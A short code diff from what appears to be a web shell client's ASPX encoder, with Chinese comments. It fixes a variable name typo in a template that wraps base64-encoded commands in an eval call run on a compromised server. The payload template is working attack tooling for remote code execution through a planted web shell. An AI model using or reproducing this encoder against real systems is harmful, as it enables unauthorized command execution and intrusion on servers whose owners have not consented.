@@ -50,7 +50,7 @@ class ASPX extends Base {
     // base64编码一次数据
     let base64Code = formatter['base64'](data['_']);
 
-    data['_'] = `Response.Write("${tag_s}");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("${babase64Code}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;
+    data['_'] = `Response.Write("${tag_s}");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("${base64Code}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;
 
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
